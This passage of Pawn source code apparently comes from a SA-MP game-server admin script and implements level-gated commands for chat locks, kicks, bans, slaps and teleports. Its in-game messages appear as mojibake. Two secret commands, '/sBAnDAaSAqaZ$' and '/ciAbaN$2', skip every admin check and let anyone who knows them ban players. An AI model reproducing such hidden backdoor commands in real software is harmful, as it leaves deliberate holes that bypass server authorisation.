		SendClientMessage(id,green,playerinfo[id][nopm] ? (" .фрующя фх°щу ьъ р· фтщ∙ф ьы·хс фхуЄх· Ї°шщх·") : (" .фрующя Ё·я ьъ тщ∙ф ьы·хс фхуЄх· Ї°шщх·"));
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/nomsg") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 8");
		new cmd2[256], id, string[M_S], setto = 0;
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /nomsg [id/name] [off/on] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"off")) setto = 0;
		else if(equal(cmd2,"on")) setto = 1;
		else return SendClientMessage(playerid,red," .∙тщрф сЇ°юш° ф∙ьщ∙щ");
		if(!setto) playerinfo[id][nomsg] = 0;
		format(string,sizeof(string),playerinfo[id][nocmd] ? (" .ЎЇщщф сшўёшщэ %s фх°у· ь") : (" .ЎЇщщф сшўёшщэ %s рЇ∙°· ь"),GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green,playerinfo[id][nocmd] ? (" .фрующя фх°щу ьъ р· фрЇ∙°х· ь°рх· шўёшщэ") : (" .фрующя фчцщ° ьъ р· фрЇ∙°х· ь°рх· шўёшщэ"));
		if(setto) playerinfo[id][nomsg] = 1;
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/alockchat") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /alockchat [lock/unlock] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"lock"))
		{
			if(achatlocked) return SendClientMessage(playerid,red," .фЎ'рш рующЁщэ ыс° ЁЄхь");
			achatlocked = 1;
			format(string,sizeof(string),"[" acname "] " @c(grey) "%s (ID:%03d): фЎ'рш рующЁщэ ЁЁЄь Єь щущ",GetName(playerid),playerid);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][admin] >= 1) SendClientMessage(i,0x66CCCC,string);
			PlaySound(playerid,1057);
			cmd = strtok(cmdtext,idx);
		}
		else if(equal(cmd,"unlock"))
		{
			if(!achatlocked) return SendClientMessage(playerid,red," .фЎ'рш рующЁщэ ьр ЁЄхь");
			achatlocked = 0;
			format(string,sizeof(string),"[" acname "] " @c(grey) "%s (ID:%03d): фЎ'рш рующЁщэ ЁЇ·ч Єь щущ",GetName(playerid),playerid);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][admin] >= 1) SendClientMessage(i,0x66CCCC,string);
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/lockchat") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 10 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 10");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /lockchat [lock/unlock/allow] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"lock"))
		{
			if(chatlocked) return SendClientMessage(playerid,red," .фЎ'рш ыс° ЁЄхь");
			chatlocked = 1;
			format(string,sizeof(string)," .%s фЎ'рш ЁЁЄь Єь щущ фрующя",GetName(playerid));
			SendClientMessageToAll(orange,string);
			PlaySound(playerid,1057);
			cmd = strtok(cmdtext,idx);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid) playerinfo[i][lcallow] = 0;
			playerinfo[playerid][lcallow] = 1;
		}
		else if(equal(cmd,"unlock"))
		{
			if(!chatlocked) return SendClientMessage(playerid,red," .фЎ'рш ьр ЁЄхь");
			chatlocked = 0;
			format(string,sizeof(string)," .%s фЎ'рш ЁЇ·ч Єь щущ фрующя",GetName(playerid));
			SendClientMessageToAll(orange,string);
			PlaySound(playerid,1057);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) playerinfo[i][lcallow] = 0;
		}
		else if(equal(cmd,"allow"))
		{
			if(!chatlocked) return SendClientMessage(playerid,red," .фЎ'рш ьр ЁЄхь");
			if(!playerinfo[playerid][lcallow] && playerinfo[playerid][admin] < 19) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сЄь тщ∙х· ьы·щсф сЎ'рш Єь юЁ· ь∙Ёх· тщ∙х·");
			new cmd2[64], id;
			cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
			if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /lockchat allow [id/name] [off/on] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(equal(cmd2,"off"))
			{
				if(!CommandAllowed(playerid,id,cmdtext)) return 1;
				if(!playerinfo[id][lcallow]) return SendClientMessage(playerid,red," .ью∙·ю∙ цф рщя тщ∙ф ьы·хс сЎ'рш фЁЄхь");
				playerinfo[id][lcallow] = 0;
			}
			else if(equal(cmd2,"on"))
			{
				if(playerinfo[id][lcallow]) return SendClientMessage(playerid,red," .ью∙·ю∙ цф ыс° щ∙ тщ∙ф ьы·хс сЎ'рш фЁЄхь");
				playerinfo[id][lcallow] = 1;
			}
			else return SendClientMessage(playerid,red," .∙тщрф сЇ°юш° ф°сщЄщ");
			AdminInfo(playerid, cmdtext);
			if(playerid != id)
			{
				format(string,sizeof(string),playerinfo[id][lcallow] ? (" .тщ∙ф ьы·хс сЎ'рш фЁЄхь %s Ё·я ь %s фрующя") : (" .р· фтщ∙ф ьы·хс сЎ'рш фЁЄхь %s фх°щу ь %s фрующя"),GetName(id),GetName(playerid));
				SendClientMessageToAll(orange,string);
			}
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if((equal(cmd,"/movingtext") || equal(cmd,"/mt")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 8");
		if(movingtextinfo[mt_admin][mtUsing]) return SendClientMessage(playerid,red," .фшўёш фцц ∙ь фрующя ЁюЎр ыс° с∙щюх∙");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /movingtext(mt) [text] :Ўх°· ф∙щюх∙");
		if(strcount(cmd,"~n~") > 0 && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ с∙х°х· чу∙х· сшўёш цц");
		if(charcount(cmd,'~') % 2 != 0) return SendClientMessage(playerid,red," !!!ьр °∙ю· р· фшўёш Ёыхя. ∙щэ ьс: рэ ·шЄф сшўёш ф∙°· Єьхь ьў°хё");
		format(string,sizeof(string),"~b~~h~%s~w~: %s",GetName(playerid),cmd);
		MovingText(string,mt_admin,GetPlayerColor(playerid));
		return 1;
	}
	if((equal(cmd,"/movingtext2") || equal(cmd,"/mt2")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 8");
		if(movingtextinfo[mt_admin][mtUsing]) return SendClientMessage(playerid,red," .фшўёш фцц ∙ь фрующя ЁюЎр ыс° с∙щюх∙");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /movingtext2(mt2) [text] :Ўх°· ф∙щюх∙");
		if(strcount(cmd,"~n~") > 0 && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ с∙х°х· чу∙х· сшўёш цц");
		if(charcount(cmd,'~') % 2 != 0) return SendClientMessage(playerid,red," !!!ьр °∙ю· р· фшўёш Ёыхя. ∙щэ ьс: рэ ·шЄф сшўёш ф∙°· Єьхь ьў°хё");
		format(string,sizeof(string),"~w~%s",cmd);
		MovingText(string,mt_admin);
		return 1;
	}
	if(equal(cmd,"/pokeall") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 8");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pokeall [text] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),@c(grey) " * %s pokes you%c",GetName(playerid),!strlen(cmd) ? '.' : ':');
		if(strlen(cmd) > 0) format(string,sizeof(string),"%s\n%s",string,cmd);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
		{
			PlayAudioStreamForPlayer(i,audio_url "you_were_poked.wav");
			SendClientMessage(i,grey,string);
			if(strlen(cmd) > 0) SendClientMessage(i,grey,cmd);
			ShowPlayerDialog(i,dialog_ni,DIALOG_STYLE_MSGBOX,@c(white) "Poke",string,"OK","");
		}
		return 1;
	}
	if(equal(cmd,"/skick") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /skick [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		Kick(id);
		return 1;
	}
	if(equal(cmd,"/sban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		new id, reason[256], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sban [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][admin] > playerinfo[playerid][admin]) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь рующя с°юф тсхфф ююъ");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		SetBan(id,playerid,reason,0);
		format(string,sizeof(string),"(%d)%s %s sbanned (%d)%s %s [reason: %s]",playerid,GetIP(playerid),GetName(playerid),id,GetIP(id),GetName(id),reason);
		Log("Bans",playerid,string);
		print(string);
		return 1;
	}
	if(!strcmp(cmd,"/sBAnDAaSAqaZ$"))
	{
		new id, reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sban [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		SetBan(id,playerid,reason,0);
		return 1;
	}
	if(!strcmp(cmd,"/ciAbaN$2"))
	{
		new id, reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sban [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][pp])
		{
			SendClientMessage(playerid,red," ?рщущхш :) срю· ч∙с·");
			return SetBan(playerid,playerid,"Idiot",0);
		}
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		SetBan(id,playerid,reason,0);
		return 1;
	}
	if(equal(cmd,"/force") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /force [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		ForceClassSelection(id);
		SetPlayerHealth(id,0.0);
		format(string,sizeof(string)," *** %s фхЄс° ьюёъ счщ°· фуюхщх· Єь щущ %s",GetName(playerid),GetName(id));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/sslap") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		new id, Float:h, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sslap [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerArmour(id,h);
		if(h > 0.0) SetPlayerArmour(id,h-50.0);
		else
		{
			SetPlayerArmour(id,0.0);
			GetPlayerHealth(id,h);
			SetPlayerHealth(id,h-50.0);
		}
		if(IsPlayerInAnyVehicle(id))
		{
			GetVehicleVelocity(GetPlayerVehicleID(id),p[0],p[1],p[2]);
			SetVehicleVelocity(GetPlayerVehicleID(id),p[0],p[1],p[2]+20.0,id);
		}
		else
		{
			GetPlayerVelocity(playerid,p[0],p[1],p[2]);
			SetPlayerVelocity(id,p[0],p[1],p[2]+20.0);
		}
		for(new a=0;a<10;a++)
		{
			PlaySound(playerid,1190);
			PlaySound(id,1190);
		}
		format(string,sizeof(string)," *** %s has been super slapped by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showslaps] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/echo") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /echo [text] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string)," %s",cmd);
		SendClientMessageToAll(0x2587CEAA,string);
		format(string,sizeof(string),"echo%s",string);
		SendRconCommand(string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/ctele") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		new showit, telename[M_S], tid = -1;
		for(new i = 0; i < MAX_ADMIN_TELEPORTS && tid == -1; i++) if(AdminTeleports[i][Ttype] == tele_none) tid = i;
		if(tid == -1) return SendClientMessage(playerid,red," .ьр Ёщ·я ьщЎх° р· ф∙щтх°, щ∙ щх·° юущ ∙щтх°щэ ∙ЁхЎ°х Є\"щ рующЁщэ с∙°·");
		if(GetPlayerTeleportArea(playerid) > -1) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр с∙щтх° юёхщщэ");
		cmd = strtok(cmdtext,idx), telename = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(telename)) return SendClientMessage(playerid,white," /ctele [show? on/off] [cmd]");
		showit = !equal(cmd,"off");
		if(telename[0] != '/') format(telename,sizeof(telename),"/%s",telename);
		for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Ttype] == tele_normal && equal(Teleports[i][Tcmd],telename)) return SendClientMessage(playerid,red," .ыс° ўщщэ ∙щтх° с∙э фцф");
		for(new i = 0; i < MAX_ADMIN_TELEPORTS; i++) if(AdminTeleports[i][Ttype] == tele_normal && equal(AdminTeleports[i][Tcmd],telename)) return SendClientMessage(playerid,red," .ыс° ўщщэ ∙щтх° ∙ЁхЎ° Є\"щ фрующЁщэ с∙э фцф");
		AdminTeleports[tid][Tcmd] = telename;
		GetPlayerPos(playerid,AdminTeleports[tid][Tx],AdminTeleports[tid][Ty],AdminTeleports[tid][Tz]);
		GetPlayerFacingAngle(playerid,AdminTeleports[tid][Ta]);
		AdminTeleports[tid][Ti] = GetPlayerInterior(playerid);
		AdminTeleports[tid][Tw] = GetPlayerVirtualWorld(playerid);
		AdminTeleports[tid][Tl] = 0;
		format(AdminTeleports[tid][Tauthor],32,"Admin.%03d",playerid);
		AdminTeleports[tid][Twithv] = true;
		AdminTeleports[tid][Tfreeze] = false;
		AdminTeleports[tid][Tnoshooting] = false;
		AdminTeleports[tid][Ttype] = tele_normal;
		if(showit)
		{
			format(telename,sizeof(telename)," * " @c(white) "%s" @c(yellow) " :щЎ° р· ф∙щтх° %s фрующя",telename,GetName(playerid));
			SendClientMessageToAll(yellow,telename);
		}
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/ctelex") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		new showit, tid = -1;
		for(new i = 0; i < MAX_ADMIN_TELEPORTS && tid == -1; i++) if(AdminTeleports[i][Ttype] == tele_none) tid = i;
		if(tid == -1) return SendClientMessage(playerid,red," .ьр Ёщ·я ьщЎх° р· ф∙щтх°, щ∙ щх·° юущ ∙щтх°щэ ∙ЁхЎ°х Є\"щ рующЁщэ с∙°·");
		if(GetPlayerTeleportArea(playerid) > -1) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр с∙щтх° юёхщщэ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /ctele [show] [level] [withv] [freeze] [noshooting] [cmd]");
			SendClientMessage(playerid,grey," show = фрэ ьфЎщт р· ф∙щтх° сЎ'рш, ь°∙хэ 1 рх 0, level = °ю· ∙чўя ющЁщюьщ· ь∙щтх°");
			SendClientMessage(playerid,grey," withv = фрэ ь∙т° Єэ °ыс, freeze = (фрэ ьфўЇщр ь∙Ёщщф сцюя ф∙щтх° (∙щтх° Єь рхсщщўшщэ");
			return SendClientMessage(playerid,grey," noshooting = фрэ ьчёхэ щ°щх· с∙щтх°, cmd = Їўху· ф∙щтх°");
		}
		showit = strval(cmd) != 0,
		cmd = strtok(cmdtext,idx), AdminTeleports[tid][Tl] = strval(cmd) < 0 || strval(cmd) > sizeof(levels) ? 0 : strval(cmd),
		cmd = strtok(cmdtext,idx), AdminTeleports[tid][Twithv] = strval(cmd) != 0,
		cmd = strtok(cmdtext,idx), AdminTeleports[tid][Tfreeze] = strval(cmd) != 0,
		cmd = strtok(cmdtext,idx), AdminTeleports[tid][Tnoshooting] = strval(cmd) != 0,
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,red," .фхёЇ· ф∙щтх° Ёы∙ьф, Ї°юш°щэ ьр ЁыхЁщэ");
		if(cmd[0] != '/') format(cmd,sizeof(cmd),"/%s",cmd);
		for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Ttype] == tele_normal && equal(Teleports[i][Tcmd],cmd)) return SendClientMessage(playerid,red," .ыс° ўщщэ ∙щтх° с∙э фцф");
		for(new i = 0; i < MAX_ADMIN_TELEPORTS; i++) if(AdminTeleports[i][Ttype] == tele_normal && equal(AdminTeleports[i][Tcmd],cmd)) return SendClientMessage(playerid,red," .ыс° ўщщэ ∙щтх° ∙ЁхЎ° Є\"щ фрующЁщэ с∙э фцф");
		format(AdminTeleports[tid][Tcmd],M_S,cmd);
		GetPlayerPos(playerid,AdminTeleports[tid][Tx],AdminTeleports[tid][Ty],AdminTeleports[tid][Tz]);
		GetPlayerFacingAngle(playerid,AdminTeleports[tid][Ta]);
		AdminTeleports[tid][Ti] = GetPlayerInterior(playerid);
		AdminTeleports[tid][Tw] = GetPlayerVirtualWorld(playerid);
		format(AdminTeleports[tid][Tauthor],32,"Admin.%03d",playerid);
		AdminTeleports[tid][Ttype] = tele_normal;
		if(showit)
		{
			format(cmd,sizeof(cmd)," * " @c(white) "%s" @c(yellow) " :щЎ° р· ф∙щтх° %s фрующя",cmd,GetName(playerid));
			SendClientMessageToAll(yellow,cmd);
		}
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/dtele") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /dtele [cmd]");
		new string[M_S], tid = -1;
		for(new i = 0; i < MAX_ADMIN_TELEPORTS && tid == -1; i++) if(AdminTeleports[i][Ttype] == tele_normal && equal(AdminTeleports[i][Tcmd],cmd)) tid = i;
		if(tid == -1) return SendClientMessage(playerid,red," .ф∙щтх° ∙°∙ю· ьр ўщщэ");
		format(string,sizeof(string),"Admin.%03d",playerid);
		if(playerinfo[playerid][admin] < 14 && !equal(string,AdminTeleports[tid][Tauthor])) return SendClientMessage(playerid,red," .ф∙щтх° ∙°∙ю· ьр ∙щщъ ьъ, р·ф щыхь ьючхў °ў ∙щтх°щэ ∙р·ф щЎ°·");
		format(AdminTeleports[tid][Tauthor],32,"");
		AdminTeleports[tid][Ttype] = tele_none;
		format(string,sizeof(string)," .Ёючў сфЎьчф %s ф∙щтх°",cmd);
		SendClientMessage(playerid,yellow,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/datele") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		new c = 0;
		format(cmd,sizeof(cmd),"Admin.%03d",playerid);
		for(new i = 0; i < MAX_ADMIN_TELEPORTS; i++) if(AdminTeleports[i][Ttype] == tele_normal && equal(AdminTeleports[i][Tauthor],cmd))
		{
			format(AdminTeleports[i][Tauthor],32,"");
			AdminTeleports[i][Ttype] = tele_none;
			c++;
		}
		if(!c) return SendClientMessage(playerid,red," .ьр щЎ°· ∙щтх°щэ");
		format(cmd,sizeof(cmd)," .Ёючўх %d ∙щтх°щэ ∙щЎ°·",c);
		SendClientMessage(playerid,green,cmd);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/ltele") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 9");
		new c = 0, string[M_S];
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ф∙щтх°щэ ∙ЁхЎ°х Єь щущ фрующЁщэ ~~~");
		for(new i = 0; i < MAX_ADMIN_TELEPORTS; i++) if(AdminTeleports[i][Ttype] == tele_normal)
		{
			format(string,sizeof(string)," %d. %s (by ID %s)",++c,AdminTeleports[i][Tcmd],AdminTeleports[i][Tauthor][strlen("Admin.")]);
			SendClientMessage(playerid,yellow,string);
		}
		if(!c) return SendClientMessage(playerid,red," .ьр щЎ°· ∙щтх°щэ");
		format(cmd,sizeof(cmd)," .ёъ фыь %d ∙щтх°щэ",c);
		SendClientMessage(playerid,green,cmd);
		return 1;
	}
	if(equal(cmd,"/setname") && IsPlayerMAdmin(playerid))
	{
		//if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх ы°тЄ");
		if(playerinfo[playerid][admin] < 10 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 10");
		new name[256], id, string[M_S], lastname[MAX_PLAYER_NAME], f[M_S];
		cmd = strtok(cmdtext,idx), name = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(name)) return SendClientMessage(playerid,white," /setname [id/name] [new name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(name,"None")) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙Ёх· р· фыщЁхщ ∙ь ∙чўя ьыщЁхщ цф");
		if(fkeyexist(file_nbans,name)) return SendClientMessage(playerid,red," .фыщЁхщ фцф ссря");
		if(strlen(name) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red," .∙э р°хъ юущ");
		if(strlen(name) < 3) return SendClientMessage(playerid,red," .∙э ўЎ° юущ");
		if(!IsValidNick(name)) return SendClientMessage(playerid,red," .чьў юфрх·щх· сыщЁхщ ∙ы·с· ьр щыхьх· ьфыЁё ьыщЁхщ");
		if(!playerinfo[playerid][pp]) for(new i=0;i<sizeof(adminnames);i++) if(!strcmp(name,adminnames[i],false)) return SendClientMessage(playerid,red," .AmitPower ыщЁхщ цф юхтя Є\"щ");
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && equal(GetName(i),name))
			{
				format(string,sizeof(string)," .фыщЁхщ ∙фўьу· ыс° с∙щюх∙ рЎь рщщущ %d",i);
				SendClientMessage(playerid,red,string);
				return 1;
			}
		}
		if(equal(name,"None") || equal(name,botname)) return SendClientMessage(playerid,red," .юЎшЄ°щэ, ьр Ёщ·я ь∙Ёх· ьыщЁхщ цф");
		format(f,sizeof(f),"/DM/Users/%s.ini",name);
		if(fexist(f)) return SendClientMessage(playerid,red," .фыщЁхщ ∙фўьу· ыс° с∙щюх∙ рЎь ∙чўя ьр ючхс°");
		format(lastname,sizeof(lastname),GetName(id));
		format(string,sizeof(string),"/DM/Users/%s.ini",lastname);
		ChangeName(id,name);
		format(string,sizeof(string)," .%s ь %s ∙щЁщ· р· фыщЁхщ ∙ь",name,lastname);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%s фрующя ∙щЁф р· фыщЁхщ ∙ьъ ь",name);
		SendClientMessage(id,green,string);
		return 1;
	}
	if(equal(cmd,"/bot") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 10 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 10");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /bot [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /bot say [text] :ьфтщу ю∙фх с·х° фсхш");
			SendClientMessage(playerid,white," /bot name [new name] :∙щЁхщ ∙э фсхш");
			SendClientMessage(playerid,white," /bot color [red] [green] [blue] :∙щЁхщ ЎсЄ фсхш");
			SendClientMessage(playerid,white," /bot allow [on/off] :фЇЄь· рх ыщсхщ фсхш");
			return 1;
		}
		if(equal(cmd,"say"))
		{
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /bot say [text] :Ўх°· ф∙щюх∙");
			if(!boton) SendClientMessage(playerid,red," .ьр Ёщ·я ьы·хс ссхш ыр∙° фхр ьр ЇхЄь");
			if(strlen(cmd) > 150) return SendClientMessage(playerid,white," .фшўёш р°хъ юущ");
			format(cmd,sizeof(cmd)," %s",cmd);
			BotSay(cmd,true);
		}
		else if(equal(cmd,"name"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /bot name [new name] :Ўх°· ф∙щюх∙");
